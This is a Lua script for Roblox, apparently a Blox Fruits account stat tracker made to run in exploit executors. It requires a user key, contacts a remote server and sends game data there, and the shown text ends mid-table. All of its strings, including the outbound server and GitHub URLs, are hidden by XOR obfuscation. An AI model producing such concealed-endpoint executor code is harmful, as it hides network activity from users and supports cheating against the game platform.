--[[
    ██████╗ ██╗  ██╗██╗   ██╗     ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
    ╚════██╗██║ ██╔╝██║   ██║     ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
     █████╔╝█████═╝ ██║   ██║        ██║   ██████╔╝███████║██║     █████═╝ █████╗  ██████╔╝
     ╚═══██╗██╔═██╗ ██║   ██║        ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ██████╔╝██║  ██╗╚██████╔╝        ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝         ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    ========================================================================================
    ANTIGRAVITY 3KG ENGINE v3.2 (ZERO-FREEZE LAZY ON-DEMAND METATABLE BUILD)
    Instantaneous 0ms Script Load Engine with Non-Blocking String Memoization
    ========================================================================================
    Protected Script: DeltaStatTracker.client.lua
    Timestamp: 2026-08-24T09:14:44.744Z
--]]

local _0x3KG_K1 = 184
local _0x3KG_K2 = 77
local _0x3KG_BYTES = {
  {165,153,148,140,144,135,134},
  {167,144,133,153,156,150,148,129,144,145,166,129,154,135,148,146,144},
  {189,129,129,133,166,144,135,131,156,150,144},
  {129,148,151,153,144},
  {196,199,198,193,192,195,194,205,204},
  {145,144,147,148,128,153,129},
  {172,186,160,167,170,160,166,176,167,170,190,176,172},
  {169,155,169,155,174,198,190,178,213,161,167,180,182,190,166,161,180,161,213,176,167,167,186,167,168,169,155,23,111,85,26,77,122,213,183,20,79,84,155,213,150,157,51,69,148,213,155,157,20,79,88,133,213,160,134,144,135,213,190,144,140,213,150,54,84,213,155,157,54,87,155,212,169,155,169,155,187,20,79,74,128,213,150,157,20,78,124,213,150,157,20,79,84,140,213,145,128,140,213,155,157,20,79,80,129,213,145,54,71,155,146,213,153,154,148,145,134,129,135,156,155,146,221,220,213,129,157,54,65,213,134,20,79,72,213,151,20,78,126,213,190,156,150,158,219,169,155,163,128,156,213,153,54,71,155,146,213,129,135,128,140,213,150,20,79,88,133,213,162,144,151,207,213,157,129,129,133,134,207,218,218,129,135,148,150,158,134,129,148,129,219,151,148,158,156,157,128,151,219,134,156,129,144,169,155,49,101,49,118,155,146,213,155,157,20,79,88,133,213,131,54,85,213,151,20,79,80,152,213,210,182,154,133,140,213,166,150,135,156,133,129,210,213,49,100,20,78,118,213,129,20,78,68,213,49,100,20,78,108,155,146,213,153,20,79,80,140,213,49,100,154,20,79,84,155,213,152,54,86,213,150,54,70,213,134,20,79,64,155,213,190,144,140,213,150,20,78,82,148,213,151,20,79,84,155,213,129,135,51,69,20,78,110,150,213,158,157,156,213,150,157,20,79,84,140,219,169,155},
  {157,129,129,133,134,207,218,218,129,135,148,150,158,134,129,148,129,219,151,148,158,156,157,128,151,219,134,156,129,144,218,148,133,156},
  {165,182,216,197,196},
  {147,128,155,150,129,156,154,155},
  {165,186,166,161},
  {148,133,133,153,156,150,148,129,156,154,155,218,159,134,154,155},
  {218,131,144,135,156,147,140,216,158,144,140,202,158,144,140,200},
  {178,176,161},
  {182,154,155,129,144,155,129,216,161,140,133,144},
  {173,216,180,165,188,216,190,144,140},
  {173,216,160,134,144,135,216,190,144,140},
  {169,155,169,155,174,198,190,178,213,161,167,180,182,190,166,161,180,161,213,176,167,167,186,167,168,169,155,23,104,121,213,160,134,144,135,213,190,144,140,213,210},
  {210,213,190,189,54,97,187,178,213,161,20,78,103,187,213,161,20,79,85,188,213,129,135,54,95,155,213,157,20,78,114,213,129,157,20,78,100,155,146,213,221,179,148,158,144,213,190,144,140,220,212,169,155,169,155,163,128,156,213,153,54,71,155,146,213,129,135,128,140,213,150,20,79,88,133,213,162,144,151,207,213,157,129,129,133,134,207,218,218,129,135,148,150,158,134,129,148,129,219,151,148,158,156,157,128,151,219,134,156,129,144,169,155,49,101,49,118,155,146,213,155,157,20,79,88,133,213,131,54,85,213,151,20,79,80,152,213,210,182,154,133,140,213,166,150,135,156,133,129,210,213,49,100,20,78,118,213,153,20,79,80,140,213,190,144,140,213,150,157,128,20,79,92,155,213,129,20,78,94,213,129,54,85,156,213,158,157,154,20,79,86,155,213,150,20,78,82,148,213,151,20,79,84,155,219,169,155},
  {182,154,135,144,178,128,156},
  {161,130,144,144,155,166,144,135,131,156,150,144},
  {165,153,148,140,144,135,178,128,156},
  {198,190,178,161,135,148,150,158,166,129,148,129,187,154,129,156,147,156,150,148,129,156,154,155,178,128,156},
  {166,150,135,144,144,155,178,128,156},
  {179,135,148,152,144},
  {161,154,148,134,129},
  {160,188,182,154,135,155,144,135},
  {160,188,166,129,135,154,158,144},
  {166,129,148,129,128,134,177,154,129},
  {161,144,141,129,185,148,151,144,153},
  {161,156,129,153,144},
  {23,111,84,213,198,190,178,213,161,167,180,182,190,166,161,180,161},
  {166,128,151,161,156,129,153,144},
  {198,190,178,213,161,167,180,182,190,166,161,180,161,213,182,186,187,187,176,182,161,176,177,213,174},
  {168},
  {167,144,152,154,129,144,134},
  {182,154,152,152,179,170},
  {177,148,129,148},
  {153,144,148,145,144,135,134,129,148,129,134},
  {187,144,128,129,135,148,153},
  {189,128,152,148,155,154,156,145,167,154,154,129,165,148,135,129},
  {189,128,152,148,155,154,156,145},
  {135,154,150,158,144,129},
  {167,154,150,158,144,129},
  {134,133,156,155},
  {166,133,156,155},
  {151,153,148,145,144},
  {183,153,148,145,144},
  {150,157,154,133},
  {182,157,154,133},
  {134,133,135,156,155,146},
  {166,133,135,156,155,146},
  {151,154,152,151},
  {183,154,152,151},
  {134,152,154,158,144},
  {166,152,154,158,144},
  {134,133,156,158,144},
  {166,133,156,158,144},
  {147,153,148,152,144},
  {179,153,148,152,144},
  {147,148,153,150,154,155},
  {179,148,153,150,154,155},
  {156,150,144},
  {188,150,144},
  {134,148,155,145},
  {166,148,155,145},
  {145,148,135,158},
  {177,148,135,158},
  {144,148,146,153,144},
  {176,148,146,153,144},
  {145,156,148,152,154,155,145},
  {177,156,148,152,154,155,145},
  {153,156,146,157,129},
  {185,156,146,157,129},
  {135,128,151,151,144,135},
  {167,128,151,151,144,135},
  {146,157,154,134,129},
  {178,157,154,134,129},
  {152,148,146,152,148},
  {184,148,146,152,148},
  {132,128,148,158,144},
  {164,128,148,158,144},
  {151,128,145,145,157,148},
  {183,128,145,145,157,148},
  {153,154,131,144},
  {185,154,131,144},
  {134,133,156,145,144,135},
  {166,133,156,145,144,135},
  {134,154,128,155,145},
  {166,154,128,155,145},
  {133,157,154,144,155,156,141},
  {165,157,154,144,155,156,141},
  {133,154,135,129,148,153},
  {165,154,135,129,148,153},
  {135,128,152,151,153,144},
  {167,128,152,151,153,144},
  {153,156,146,157,129,155,156,155,146},
  {185,156,146,157,129,155,156,155,146},
  {133,148,156,155},
  {165,148,156,155},
  {151,153,156,143,143,148,135,145},
  {183,153,156,143,143,148,135,145},
  {146,135,148,131,156,129,140},
  {178,135,148,131,156,129,140},
  {152,148,152,152,154,129,157},
  {184,148,152,152,154,129,157},
  {129,216,135,144,141},
  {161,216,167,144,141},
  {129,135,144,141},
  {145,154,128,146,157},
  {177,154,128,146,157},
  {134,157,148,145,154,130},
  {166,157,148,145,154,130},
  {131,144,155,154,152},
  {163,144,155,154,152},
  {146,148,134},
  {178,148,134},
  {134,133,156,135,156,129},
  {166,133,156,135,156,129},
  {150,154,155,129,135,154,153},
  {182,154,155,129,135,154,153},
  {153,144,154,133,148,135,145},
  {185,144,154,133,148,135,145},
  {129,156,146,144,135},
  {161,156,146,144,135},
  {140,144,129,156},
  {172,144,129,156},
  {145,135,148,146,154,155},
  {177,135,148,146,154,155},
  {158,156,129,134,128,155,144},
  {190,156,129,134,128,155,144},
  {151,148,135,135,156,144,135},
  {183,148,135,135,156,144,135},
  {150,135,144,148,129,156,154,155},
  {182,135,144,148,129,156,154,155},
  {129,208,216,135,144,141},
  {174},
  {208,134,223,147,135,128,156,129,208,134,223},
  {208,134,222},
  {216},
  {179,154,153,145,144,135},
  {184,154,145,144,153},
  {185,144,131,144,153},
  {163,148,153,128,144},
  {165,154,156,155,129,134},
  {184,148,134,129,144,135,140},
  {183,144,153,156},
  {179,135,148,146,152,144,155,129,134},
  {199,204,219,204,184},
  {199,219,192,184},
  {194,192,197,190},
  {209,199,217,192,197,197,217,197,197,197},
  {208,209},
  {217},
  {171,208,134,223,221,219,216,220,208,134,223,209},
  {208,196},
  {198,197,184},
  {221,208,145,222,208,219,202,208,145,223,220,208,134,223,174,152,184,168},
  {196,192,197,219,192,190},
  {221,208,145,222,208,219,202,208,145,223,220,208,134,223,174,158,190,168},
  {174,171,197,216,204,168},
  {183,154,128,155,129,140,218,189,154,155,154,135},
  {183,154,128,155,129,140,213,218,213,189,154,155,154,135},
  {163,148,153,128,144,186,151,159,144,150,129},
  {183,154,128,155,129,140},
  {151,154,128,155,129,140},
  {189,154,155,154,135},
  {157,154,155,154,135},
  {184,148,156,155},
  {189,128,152,148,155},
  {167,148,150,144},
  {187,154,155,144},
  {146,144,129,167,148,150,144},
  {146,144,129,167,148,150,144,187,148,152,144},
  {134,129,135,156,155,146},
  {163,193},
  {131,193},
  {180,130,148,158,144,155,144,145},
  {167,148,150,144,163,193},
  {135,148,150,144,170,131,193},
  {167,148,150,144,170,163,193},
  {183,148,150,158,133,148,150,158},
  {179,188,166,189,184,180,187},
  {166,189,180,167,190},
  {162,180,161,176,167,213,183,186,177,172},
  {162,180,161,176,167,183,186,177,172},
  {166,157,148,135,158},
  {184,188,187,190},
  {167,180,183,183,188,161},
  {180,178,188,185,188,161,172},
  {184,156,155,158},
  {180,187,178,176,185},
  {166,190,172},
  {189,176,180,163,176,187,185,172},
  {180,155,146,144,153},
  {178,189,186,160,185},
  {189,176,188,178,189,161,176,187,176,177},
  {178,157,154,128,153},
  {182,172,183,186,167,178},
  {176,187,176,167,178,172,213,182,186,167,176},
  {182,140,151,154,135,146},
  {185,180,166,161,213,167,176,166,186,167,161},
  {185,180,166,161,167,176,166,186,167,161},
  {167,180,182,176,213,163,193},
  {167,180,182,176,163,193},
  {161,167,180,187,166,179,186,167,184,213,221,163,193,220},
  {163,193,213,161,167,180,187,166,179,186,167,184},
  {180,130,148,158,144,155,156,155,146,184,144,129,144,135},
  {167,148,150,144,176,155,144,135,146,140},
  {180,130,148,158,144,155,156,155,146,183,148,135},
  {163,193,183,148,135},
  {167,180,182,176,213,163,198},
  {167,180,182,176,163,198},
  {167,180,182,176,213,163,199},
  {167,180,182,176,163,199},
  {182},
  {146,144,129,167,148,150,144,185,144,131,144,153},
  {163,198},
  {198},
  {163,199},
  {199},
  {147,156,134,157,152,148,155},
  {134,158,140},
  {134,158,140,133,156,144,148},
  {135,148,151,151,156,129},
  {129,135,128,144},
  {189,148,134,163,193},
  {167,148,150,144,193},
  {180,130,148,158,144,155,144,145,167,148,150,144},
  {167,148,150,144,163,198},
  {189,148,134,163,198},
  {167,148,150,144,198},
  {167,148,150,144,163,199},
  {189,148,134,163,199},
  {167,148,150,144,199},
  {167,148,150,144,163,144,135,134,156,154,155},
  {167,148,150,144,185,144,131,144,153},
  {208,134,223,174,131,163,168,174,196,199,198,193,168,208,134,223},
  {182,157,144,150,158,161,144,152,133,153,144,177,154,154,135},
  {165,128,153,153,185,144,131,144,135},
  {185,144,131,144,135,165,128,153,153,144,145},
  {185,144,131,144,135},
  {161,144,152,133,153,144,185,144,131,144,135},
  {167,148,150,144,163,193,185,144,131,144,135},
  {182,157,144,150,158,185,144,131,144,135},
  {178,144,129,185,144,131,144,135},
  {182,157,144,150,158,185,144,131,144,135,165,128,153,153,144,145},
  {161,144,152,133,153,144,186,147,161,156,152,144},
  {165,128,153,153,144,145},
  {180,153,135,144,148,145,140,213,165,128,153,153,144,145},
  {182,154,152,151,148,129},
  {165,128,153,153,213,185,144,131,144,153},
  {165,128,153,153,213,185,144,131,144,135},
  {161,154,154,153},
  {180,150,150,144,134,134,154,135,140},
  {152,156,135,135,154,135},
  {184,156,135,135,154,135},
  {184,156,135,135,154,135,213,179,135,148,150,129,148,153},
  {131,148,153,158,140,135,156,144},
  {163,148,153,158,140,135,156,144},
  {163,148,153,158,140,135,156,144,213,189,144,153,152},
  {148,155,150,157,154,135},
  {166,157,148,135,158,213,180,155,150,157,154,135},
  {146,144,129,188,155,131,144,155,129,154,135,140},
  {146,144,129,188,155,131,144,155,129,154,135,140,162,144,148,133,154,155,134},
  {146,144,129,188,155,131,144,155,129,154,135,140,184,148,129,144,135,156,148,153,134},
  {146,144,129,188,155,131,144,155,129,154,135,140,179,135,128,156,129,134},
  {177,144,131,156,153,179,135,128,156,129},
  {179,135,128,156,129},
  {183,153,154,141,213,179,135,128,156,129},
  {171,221,219,216,220,208,134,223,208,174},
  {171,221,219,216,220,208,134,223,179,135,128,156,129},
  {166,148,155,146,128,156,155,144},
  {166,148,155,146,128,156,155,144,213,180,135,129},
  {178,154,145,157,128,152,148,155},
  {177,135,148,146,154,155,213,161,148,153,154,155},
  {176,153,144,150,129,135,156,150,213,182,153,148,130},
  {166,157,148,135,158,152,148,155},
  {162,148,129,144,135,213,190,128,155,146},
  {166,157,148,135,158,152,148,155,213,190,148,135,148,129,144},
  {177,144,148,129,157,213,166,129,144,133},
  {166,128,133,144,135,157,128,152,148,155},
  {177,135,148,146,154,155,213,182,153,148,130},
  {179,156,134,157,152,148,155},
  {179,156,134,157,152,148,155,213,190,148,135,148,129,144},
  {176,153,144,150,129,135,154},
  {183,153,148,150,158,213,185,144,146},
  {177,148,135,158,213,166,129,144,133},
  {184,144,153,144,144},
  {166,180,187,178,160,188,187,176},
  {178,186,177,189,160,184,180,187},
  {177,167,180,178,186,187,213,161,180,185,186,187},
  {176,185,176,182,161,167,188,182,213,182,185,180,162},
  {166,189,180,167,190,184,180,187},
  {162,180,161,176,167,213,190,160,187,178},
  {177,176,180,161,189,213,166,161,176,165},
  {166,160,165,176,167,189,160,184,180,187},
  {179,156,146,157,129,156,155,146,166,129,140,153,144},
  {176,153,144,150,129,135,156,150},
  {162,148,129,144,135,213,190,128,155,146,213,179,128},
  {177,135,148,146,154,155,213,183,135,144,148,129,157},
  {184,154,145,128,153,144,134},
  {187,144,129},
  {167,179,218,178,144,129,180,153,153,188,129,144,152,163,148,153,128,144,134},
  {188,134,186,130,155,144,145},
  {155,128,152,151,144,135},
  {183,128,140,166,148,155,146,128,156,155,144,180,135,129},
  {183,128,140,177,135,148,146,154,155,161,148,153,154,155},
  {183,128,140,178,154,145,157,128,152,148,155},
  {183,128,140,176,153,144,150,129,135,156,150,182,153,148,130},
  {183,128,140,166,157,148,135,158,152,148,155,190,148,135,148,129,144},
  {183,128,140,177,144,148,129,157,166,129,144,133},
  {183,128,140,166,128,133,144,135,157,128,152,148,155},
  {183,153,148,150,158,151,144,148,135,145,167,144,130,148,135,145},
  {177,135,148,146,154,155,182,153,148,130},
  {196},
  {183,128,140,179,156,134,157,152,148,155,190,148,135,148,129,144},
  {183,128,140,176,153,144,150,129,135,154},
  {183,128,140,183,153,148,150,158,185,144,146},
  {190,148,135,148,129,144},
  {166,129,144,133},
  {182,153,148,130},
  {180,135,129},
  {166,130,154,135,145},
  {190,148,129,148,155,148},
  {180,155,150,157,154,135},
  {178,128,156,129,148,135},
  {184,148,134,129,144,135,140,208,134,223,221,208,145,222,220},
  {184,148,134,208,219,208,134,223,221,208,145,222,220},
  {179,166,184,148,134,129,144,135,140},
  {166,130,154,135,145,184,148,134,129,144,135,140},
  {183,153,154,141},
  {166,129,140,153,144},
  {166,148,151,144,135},
  {172,148,152,148},
  {161,128,134,157,156,129,148},
  {182,128,135,134,144,145},
  {165,154,153,144},
  {166,150,140,129,157,144},
  {177,148,146,146,144,135},
  {167,144,155,146,154,158,128},
  {182,148,155,131,148,155,145,144,135},
  {183,128,145,145,140},
  {166,133,156,158,144,140},
  {161,135,128,144,213,161,135,156,133,153,144},
  {189,148,153,153,154,130},
  {177,128,148,153},
  {182,128,135,135,144,155,129,166,130,154,135,145},
  {182,128,135,134,144,145,213,177,128,148,153,213,190,148,129,148,155,148},
  {182,177,190},
  {161,135,128,144,213,161,135,156,133,153,144,213,190,148,129,148,155,148},
  {161,161,190},
  {189,148,153,153,154,130,213,166,150,140,129,157,144},
  {177,148,135,158,213,177,148,146,146,144,135},
  {166,133,156,158,144,140,213,161,135,156,145,144,155,129},
  {183,128,145,145,140,213,166,130,154,135,145},
  {165,154,153,144,213,221,199,155,145,213,179,154,135,152,220},
  {165,154,153,144,213,199},
  {165,154,153,144,213,221,196,134,129,213,179,154,135,152,220},
  {165,154,153,144,213,196},
  {166,154,128,153,213,178,128,156,129,148,135},
  {166,158,128,153,153,213,178,128,156,129,148,135},
  {166,144,135,133,144,155,129,213,183,154,130},
  {183,154,130},
  {190,148,151,128,150,157,148},
  {180,150,156,145,128,152,213,167,156,147,153,144},
  {180,150,156,145,128,152},
  {183,156,143,148,135,135,144,213,167,156,147,153,144},
  {182,148,155,155,154,155},
  {179,153,156,155,129,153,154,150,158},
  {184,128,134,158,144,129},
  {166,153,156,155,146,134,157,154,129},
  {178,128,155},
  {146,144,129,188,155,131,144,155,129,154,135,140,182,153,154,129,157,134},
  {146,144,129,188,155,131,144,155,129,154,135,140,166,129,148,134,157},
  {146,144,129,184,148,129,144,135,156,148,153,134},
  {188,129,144,152,167,144,133,153,156,150,148,129,156,154,155,166,144,135,131,156,150,144},
  {190,176,172,166},
  {188,129,144,152,182,154,155,147,156,146},
  {147,135,148,150,129,148,153},
  {185,131,208,219,208,134,223,221,208,145,222,220},
  {185,144,131,144,153,208,134,223,221,208,145,222,220},
  {184,154,155,144,140},
  {179,135,148,146,152,144,155,129},
  {161,157,156,135,145,213,166,144,148},
  {166,144,150,154,155,145,213,166,144,148},
  {179,156,135,134,129,213,166,144,148},
  {166,144,148},
  {162,154,135,153,145},
  {161,157,156,135,145},
  {166,144,150,154,155,145},
  {166,129,148,129,134},
  {183,153,154,141,179,135,128,156,129},
  {151,153,154,141,179,135,128,156,129},
  {151,153,154,141,170,147,135,128,156,129},
  {177,144,152,154,155,213,179,135,128,156,129},
  {177,144,152,154,155,179,135,128,156,129},
  {177,144,152,154,155},
  {152,144,153,144,144},
  {177,144,147,144,155,134,144},
  {145,144,147,144,155,134,144},
  {134,130,154,135,145},
  {146,128,155},
  {179,135,128,156,129,180,130,148,158,144,155,144,145},
  {190,156,153,153,134},
  {177,144,148,129,157,134},
  {164,128,144,134,129,134,182,154,152,133,153,144,129,144,145},
  {183,154,134,134,144,134,177,144,147,144,148,129,144,145},
  {170},
  {162,148,156,129,156,155,146,213,129,154,213,191,154,156,155,213,161,144,148,152,219,219,219},
  {167,144,148,145,156,155,146,213,166,129,148,129,134,219,219,219},
  {218,134,129,148,129,134,218,134,140,155,150},
  {23,111,84,213,174,198,190,178,213,161,167,180,182,190,166,161,180,161,168,213,166,140,155,150,213,129,157,54,85,155,157,213,150,54,65,155,146,213,185,131,153,213},
  {198,190,178,213,161,167,180,182,190,166,161,180,161,213,166,172,187,182,188,187,178,219,219,219},
  {134,129,144,133},
  {157,129,129,133,134,207,218,218,135,148,130,219,146,156,129,157,128,151,128,134,144,135,150,154,155,129,144,155,129,219,150,154,152,218,185,140,155,141,199,196,195,199,218,182,154,155,150,148,150,218,135,144,147,134,218,157,144,148,145,134,218,152,148,156,155,218,152,144,152,148,140,151,144,154,219,153,128,148}
}

local _0xSYS_char = string.char
local _0xSYS_concat = table.concat
local _0xSYS_bxor = (bit32 and bit32.bxor) or (bit and bit.bxor) or function(a, b)
    local r = 0
    for i = 0, 31 do
        local a1 = (a / 2^i) % 2 >= 1
        local b1 = (b / 2^i) % 2 >= 1
        if a1 ~= b1 then r = r + 2^i end
    end
    return r
end

-- Non-Blocking Lazy On-Demand Memoized String Decryption Metatable (0ms Instant Load)
local _0x3KG_CACHE = {}
local _0x3KG_STR = setmetatable({}, {
    __index = function(tbl, idx)
        local cached = _0x3KG_CACHE[idx]
        if cached then return cached end
        local raw = _0x3KG_BYTES[idx]
        if not raw then return "" end
        local s = {}
        for j = 1, #raw do
            local b = _0xSYS_bxor(_0xSYS_bxor(raw[j], _0x3KG_K2), _0x3KG_K1) % 256
            s[j] = _0xSYS_char(b)
        end
        local str = _0xSYS_concat(s)
        _0x3KG_CACHE[idx] = str
        return str
    end
})

-- Antigravity Environment Shield & Anti-Decompiler Check
pcall(function()
    if getfenv and type(getfenv) == "function" then
        local _0xENV = getfenv()
        _0xENV["__3KG_PROTECTED__"] = true
        _0xENV["__ANTIGRAVITY__"] = "v3.2"
    end
end)


--[[
    ==================================================
    3KG TRACKSTAT - Ultra-Lightweight Sync
    ==================================================
    - Tự động giữ trạng thái ONLINE xanh khi đang ở trong game (sync 15s/lần).
    - Cột Melee bên dưới: Chỉ hiển thị Võ ĐANG SỬ DỤNG (Equipped Fighting Style).
    - Box Item Monitor bên trên: Đếm tổng sở hữu Sanguine Art và Godhuman nếu đã sở hữu.
]]

pcall(function()
    if not game:IsLoaded() then
        repeat task.wait(0.5) until game:IsLoaded()
    end
end)

local Players = game:GetService(_0x3KG_STR[1])
local ReplicatedStorage = game:GetService(_0x3KG_STR[2])
local HttpService = game:GetService(_0x3KG_STR[3])
local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
    local startT = tick()
    while not Players.LocalPlayer and (tick() - startT < 10) do
        task.wait(0.5)
    end
    LocalPlayer = Players.LocalPlayer
end

-- ==================================================
-- KICK TỨC THÌ NẾU CHỈ CHẠY MỖI LOADSTRING MÀ KHÔNG CÓ _G.Config / KEY CÁ NHÂN
-- ==================================================
local hasValidConfig = _G.Config and type(_G.Config) == _0x3KG_STR[4]
local userKey = (hasValidConfig and (_G.Config.USER_KEY or _G.Config.API_KEY)) or ""

if not hasValidConfig or not userKey or userKey == "" or userKey == _0x3KG_STR[5] or userKey == _0x3KG_STR[6] or userKey == _0x3KG_STR[7] then
    if LocalPlayer then
        LocalPlayer:Kick(_0x3KG_STR[8])
    end
    return
end

local CONFIG = {
    SERVER_URL = (_G.Config and _G.Config.SERVER_URL) or _0x3KG_STR[9],
    USER_KEY = userKey,
    PC_NAME = (_G.Config and _G.Config.PC_NAME) or _0x3KG_STR[10]
}

local SERVER_URL = CONFIG.SERVER_URL
local API_KEY = CONFIG.USER_KEY
local PC_NAME = CONFIG.PC_NAME

-- ==================================================
-- SAFE HTTP REQUEST HELPER (ALL EXECUTORS SUPPORTED)
-- ==================================================
local function safeHttpRequest(options)
    local req = (type(syn) == _0x3KG_STR[4] and type(syn.request) == _0x3KG_STR[11] and syn.request)
             or (type(http) == _0x3KG_STR[4] and type(http.request) == _0x3KG_STR[11] and http.request)
             or (type(http_request) == _0x3KG_STR[11] and http_request)
             or (type(request) == _0x3KG_STR[11] and request)
             or (type(fluxus) == _0x3KG_STR[4] and type(fluxus.request) == _0x3KG_STR[11] and fluxus.request)
             or (type(krnl) == _0x3KG_STR[4] and type(krnl.request) == _0x3KG_STR[11] and krnl.request)

    if req then
        local ok, res = pcall(function()
            return req(options)
        end)
        if ok and res then return ok, res end
    end

    -- Fallback to HttpPost / HttpGet
    if options.Method == _0x3KG_STR[12] and game.HttpPost then
        local ok, bodyRes = pcall(function()
            return game:HttpPost(options.Url, options.Body or "", _0x3KG_STR[13])
        end)
        if ok then return true, { StatusCode = 200, Body = bodyRes } end
    elseif game.HttpGet then
        local ok, bodyRes = pcall(function()
            return game:HttpGet(options.Url)
        end)
        if ok then return true, { StatusCode = 200, Body = bodyRes } end
    end

    return false, nil
end

local function verifyKeyWithServer()
    local verifyUrl = SERVER_URL .. _0x3KG_STR[14] .. tostring(API_KEY)
    local success, response = safeHttpRequest({
        Url = verifyUrl,
        Method = _0x3KG_STR[15],
        Headers = {
            [_0x3KG_STR[16]] = _0x3KG_STR[13],
            [_0x3KG_STR[17]] = API_KEY,
            [_0x3KG_STR[18]] = API_KEY
        }
    })

    if success and response and response.Body then
        local ok, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok and data then
            if data.valid == false then
                if LocalPlayer then
                    LocalPlayer:Kick(_0x3KG_STR[19] .. tostring(API_KEY) .. _0x3KG_STR[20])
                end
                return false
            end
        end
    end
    return true
end

if not verifyKeyWithServer() then
    return
end

-- ==================================================
-- SLEEK BOTTOM-RIGHT NOTIFICATION GUI (3KG TRACKSTAT)
-- ==================================================
local CoreGui = game:GetService(_0x3KG_STR[21])
local TweenService = game:GetService(_0x3KG_STR[22])
local PlayerGui = LocalPlayer:WaitForChild(_0x3KG_STR[23], 10) or LocalPlayer:FindFirstChildOfClass(_0x3KG_STR[23])

local subTextLabel, statusDot

local function createNotificationGui()
    local guiName = _0x3KG_STR[24]
    
    local parentTarget = (type(gethui) == _0x3KG_STR[11] and gethui()) or game:GetService(_0x3KG_STR[21]) or (LocalPlayer and (LocalPlayer:FindFirstChildOfClass(_0x3KG_STR[23])))
    if parentTarget and parentTarget:FindFirstChild(guiName) then
        parentTarget[guiName]:Destroy()
    end

    local screenGui = Instance.new(_0x3KG_STR[25])
    screenGui.Name = guiName
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 999999
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    if parentTarget then screenGui.Parent = parentTarget end

    -- Main Toast Card (Bottom Right Corner)
    local toast = Instance.new(_0x3KG_STR[26])
    toast.Name = _0x3KG_STR[27]
    toast.Size = UDim2.new(0, 240, 0, 52)
    toast.Position = UDim2.new(1, -250, 1, -66)
    toast.BackgroundColor3 = Color3.fromRGB(15, 15, 24)
    toast.BackgroundTransparency = 0.15
    toast.BorderSizePixel = 0
    toast.ZIndex = 999999
    toast.Parent = screenGui

    local corner = Instance.new(_0x3KG_STR[28])
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = toast

    local stroke = Instance.new(_0x3KG_STR[29])
    stroke.Color = Color3.fromRGB(139, 92, 246)
    stroke.Thickness = 1.2
    stroke.Transparency = 0.3
    stroke.Parent = toast

    -- Pulsing Status Dot
    local dot = Instance.new(_0x3KG_STR[26])
    dot.Name = _0x3KG_STR[30]
    dot.Size = UDim2.new(0, 8, 0, 8)
    dot.Position = UDim2.new(0, 12, 0, 14)
    dot.BackgroundColor3 = Color3.fromRGB(34, 197, 94)
    dot.BorderSizePixel = 0
    dot.Parent = toast

    local dotCorner = Instance.new(_0x3KG_STR[28])
    dotCorner.CornerRadius = UDim.new(1, 0)
    dotCorner.Parent = dot

    -- Header Title Text
    local titleLabel = Instance.new(_0x3KG_STR[31])
    titleLabel.Name = _0x3KG_STR[32]
    titleLabel.Size = UDim2.new(1, -30, 0, 16)
    titleLabel.Position = UDim2.new(0, 26, 0, 10)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Text = _0x3KG_STR[33]
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 12
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = toast

    -- Subtitle / Status Text
    local subLabel = Instance.new(_0x3KG_STR[31])
    subLabel.Name = _0x3KG_STR[34]
    subLabel.Size = UDim2.new(1, -24, 0, 18)
    subLabel.Position = UDim2.new(0, 12, 0, 26)
    subLabel.BackgroundTransparency = 1
    subLabel.Font = Enum.Font.GothamMedium
    subLabel.Text = _0x3KG_STR[35] .. tostring(PC_NAME) .. _0x3KG_STR[36]
    subLabel.TextColor3 = Color3.fromRGB(161, 161, 170)
    subLabel.TextSize = 10
    subLabel.TextXAlignment = Enum.TextXAlignment.Left
    subLabel.Parent = toast

    subTextLabel = subLabel
    statusDot = dot
end

pcall(createNotificationGui)

local function updateToastStatus(text, isError)
    if subTextLabel then
        subTextLabel.Text = text
        if isError then
            subTextLabel.TextColor3 = Color3.fromRGB(248, 113, 113)
            if statusDot then statusDot.BackgroundColor3 = Color3.fromRGB(239, 68, 68) end
        else
            subTextLabel.TextColor3 = Color3.fromRGB(161, 161, 170)
            if statusDot then statusDot.BackgroundColor3 = Color3.fromRGB(34, 197, 94) end
        end
    end
end

local CommF_ = ReplicatedStorage:WaitForChild(_0x3KG_STR[37], 10) and ReplicatedStorage.Remotes:WaitForChild(_0x3KG_STR[38], 10)
local dataFolder = LocalPlayer:WaitForChild(_0x3KG_STR[39], 15) or LocalPlayer
local leaderstats = LocalPlayer:WaitForChild(_0x3KG_STR[40], 15)

-- CHỜ HOÀN TẤT JOIN TEAM & EXECUTE CÁC SCRIPT KHÁC TRƯỚC KHI GỬI DỮ LIỆU
local function waitForTeamAndLoaded()
    local teamTimeout = tick() + 30
    while (not LocalPlayer.Team or LocalPlayer.Team.Name == "" or LocalPlayer.Team.Name == _0x3KG_STR[41]) and tick() < teamTimeout do
        task.wait(1)
    end

    local charTimeout = tick() + 30
    while tick() < charTimeout do
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild(_0x3KG_STR[42])
        local hum = char and char:FindFirstChildOfClass(_0x3KG_STR[43])
        if char and hrp and hum and hum.Health > 0 then
            break
        end
        task.wait(1)
    end

    task.wait(5)
end

waitForTeamAndLoaded()

local knownFruitNames = {
    [_0x3KG_STR[44]] = _0x3KG_STR[45], [_0x3KG_STR[46]] = _0x3KG_STR[47], [_0x3KG_STR[48]] = _0x3KG_STR[49], [_0x3KG_STR[50]] = _0x3KG_STR[51],
    [_0x3KG_STR[52]] = _0x3KG_STR[53], [_0x3KG_STR[54]] = _0x3KG_STR[55], [_0x3KG_STR[56]] = _0x3KG_STR[57], [_0x3KG_STR[58]] = _0x3KG_STR[59],
